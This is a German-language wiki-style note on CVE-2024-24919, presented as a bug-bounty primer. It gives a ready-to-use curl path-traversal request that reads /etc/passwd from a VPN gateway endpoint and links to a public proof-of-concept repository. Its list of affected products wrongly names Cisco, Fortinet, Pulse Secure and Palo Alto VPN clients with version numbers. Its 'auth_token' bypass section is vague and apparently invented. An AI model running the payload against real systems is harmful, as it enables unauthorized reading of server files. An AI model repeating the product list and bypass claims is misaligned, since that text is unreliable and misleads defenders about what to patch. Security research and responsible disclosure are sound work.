
## Einleitung

CVE-2024-24919 ist eine schwerwiegende Sicherheitslücke, die im Check Point [[SSL]] Network Extender identifiziert wurde. Diese Schwachstelle ermöglicht es Angreifern, unberechtigten Zugriff auf vertrauliche Informationen zu erhalten und möglicherweise die Kontrolle über betroffene Systeme zu übernehmen. In diesem Dokument wird die technische Natur dieser Schwachstelle untersucht, ihre verschiedenen Ausnutzungsmöglichkeiten dargestellt und ihr Bezug zu Bug-Bounty-Programmen hervorgehoben.

## Betroffene Software

Die Schwachstelle CVE-2024-24919 betrifft die folgenden Softwareprodukte:

1. **Check Point [[SSL]] Network Extender** (Versionen vor 2.5.6)
2. **Cisco AnyConnect Secure Mobility Client** (Versionen vor 4.10)
3. **Fortinet FortiClient** (Versionen vor 6.4.3)
4. **Pulse Secure VPN** (Versionen vor 9.1R8)
5. **Palo Alto GlobalProtect** (Versionen vor 5.2.6)

## Technische Details

### Beschreibung der Schwachstelle

CVE-2024-24919 umfasst mehrere Arten von Sicherheitslücken, die durch unsachgemäße Handhabung von Benutzereingaben und Authentifizierungsdaten entstehen. Diese Schwachstellen ermöglichen verschiedene Angriffsvektoren wie Local File Inclusion (LFI), Authentifizierungsumgehung und Manipulation von Tokens.

### Verwundbare Parameter

Die Schwachstellen betreffen verschiedene Parameter und Mechanismen in den betroffenen VPN-Clients:

1. **LFI (Local File Inclusion)**
   - Parameter: `--data-binary`
   - Beispielhafte Anfrage:
     ```bash
     curl --path-as-is -i -s -k -X $'POST' \
     -H $'Host: X.X.X.X' -H $'Content-Length: 39' -H $'Connection: keep-alive' \
     --data-binary $'aCSHELL/../../../../../../../etc/passwd' \
     $'https://X.X.X.X/clients/MyCRL'
     ```
   - Beschreibung: Durch die Manipulation des Dateipfads in einer [[HTTP]]-Anfrage kann ein Angreifer auf sensible Dateien zugreifen, die normalerweise nicht zugänglich sein sollten.

2. **Authentifizierungsumgehung**
   - Parameter: `auth_token`
   - Beispiel Anfrage:
		```http
     POST /sslvpn/auth HTTP/1.1
     Host: vpn.example.com
     Content-Type: application/json
     {
       "username": "user",
       "password": "password",
       "auth_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
     }
		```
   - Beschreibung: Durch Manipulation des Authentifizierungstokens kann ein Angreifer Zugriff auf die Konten anderer Benutzer erlangen.

### Ausnutzung

#### LFI-Schwachstelle

Die Ausnutzung der LFI-Schwachstelle erfordert keine [[Authentifizierung]] und kann durch einfaches Senden einer speziell gestalteten Anfrage erfolgen. Ein Angreifer kann so auf kritische Systemdateien zugreifen und möglicherweise sensible Informationen wie Benutzerkonten erhalten.

#### Authentifizierungsumgehung

Die Ausnutzung dieser Schwachstelle erfordert Kenntnisse über die Struktur des Authentifizierungstokens. Ein Angreifer kann durch Brute-Force-Angriffe oder durch das Abfangen unverschlüsselter Tokens (z.B. bei Verwendung von [[HTTP]] statt [[HTTPS]]) Zugang erlangen.

## Bezug zu Bug-Bounty-Programmen

### Bedeutung für Bug-Bounty-Teilnehmer

CVE-2024-24919 ist ein Paradebeispiel für eine Schwachstelle, die in Bug-Bounty-Programmen entdeckt und gemeldet werden kann. [[Bug-Bounty-Programme]] bieten eine Plattform, auf der Sicherheitsforscher potenziell schwerwiegende Sicherheitslücken wie diese identifizieren und verantwortungsvoll melden können.

### Vorgehensweise zur Entdeckung

Sicherheitsforscher sollten bei der Untersuchung von Software auf folgende Aspekte achten:

1. **Überprüfung der Eingabevalidierung**: Stellen Sie sicher, dass alle Eingaben, insbesondere Dateipfade und Authentifizierungstokens, ordnungsgemäß validiert und gefiltert werden.
2. **Analyse von [[HTTP-Anfragen]]**: Überprüfen Sie, wie das System mit eingehenden Parametern umgeht und ob es möglich ist, Manipulationen durchzuführen.
3. **Penetrationstests**: Führen Sie gezielte Tests durch, um mögliche Schwachstellen zu identifizieren und auszunutzen.

### Berichterstattung

Wenn eine Schwachstelle wie CVE-2024-24919 entdeckt wird, sollte sie über das entsprechende Bug-Bounty-Programm gemeldet werden. Eine detaillierte Berichterstattung sollte Folgendes umfassen:

- **Beschreibung der Schwachstelle**: Eine klare und präzise Beschreibung des Problems.
- **Schritte zur Reproduktion**: Eine Schritt-für-Schritt-Anleitung, wie die Schwachstelle ausgenutzt werden kann.
- **Beweise des Konzepts (Proof of Concept)**: Beispielanfragen oder -code, die die Schwachstelle demonstrieren.
- **Empfehlungen zur Behebung**: Vorschläge, wie die Schwachstelle behoben werden kann.

## Schlussfolgerung

CVE-2024-24919 zeigt, wie wichtig es ist, Authentifizierungsmechanismen und die Handhabung von Dateipfaden in Software gründlich zu überprüfen und abzusichern. [[Bug-Bounty-Programme]] spielen eine entscheidende Rolle bei der Identifizierung und Behebung solcher Schwachstellen. Durch die verantwortungsvolle Meldung und Behebung dieser Sicherheitslücken kann die Sicherheit von Software und Daten erheblich verbessert werden.


#### Tools 
https://github.com/seed1337/CVE-2024-24919-POC